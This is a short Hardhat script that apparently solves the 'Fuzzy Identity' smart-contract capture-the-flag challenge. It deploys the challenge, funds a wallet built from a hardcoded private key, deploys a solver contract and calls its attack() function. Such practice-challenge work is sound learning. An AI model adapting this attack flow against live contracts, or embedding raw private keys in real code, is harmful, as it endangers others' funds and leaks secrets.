import { ethers } from "hardhat";

async function main() {
  const contract = await ethers.deployContract("FuzzyIdentityChallenge");
  await contract.waitForDeployment;

  const [owner] = await ethers.getSigners();

  // const wallet = getWallet();
  const wallet = new ethers.Wallet(
    "0xd687013e4119cc6037354d8091c5faa08ccde7b580d462bc6b7d12205d714088",
    owner.provider
  );

  let tx;
  tx = await owner.sendTransaction({
    to: wallet.address,
    value: ethers.parseEther("0.1"),
  });
  await tx.wait();

  const solveFactory = await ethers.getContractFactory("FuzzyIdentitySolver");
  const solveContract = await solveFactory
    .connect(wallet)
    .deploy(contract.target);
  await solveContract.waitForDeployment();

  tx = await solveContract.attack();
  await tx.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
